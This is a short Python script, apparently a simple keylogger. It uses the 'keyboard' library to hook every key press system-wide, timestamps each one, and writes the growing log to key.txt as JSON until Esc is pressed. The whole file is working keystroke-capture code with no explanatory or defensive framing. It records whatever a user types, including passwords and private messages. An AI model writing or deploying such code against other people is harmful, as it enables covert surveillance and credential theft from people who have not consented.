import keyboard
from datetime import datetime
import json

key_events = []

def on_key_event(event):
    if event.event_type == 'down':
        event_details = {
            'Key': event.name,
            'Event': event.event_type,
            'Time': datetime.fromtimestamp(event.time).strftime('%Y-%m-%d %H:%M:%S'),
        }
        key_events.append(event_details)
        
        # Write the updated list to the file
        with open('key.txt', 'w') as file:
            json.dump(key_events, file, indent=4)

keyboard.hook(on_key_event)
keyboard.wait('esc')
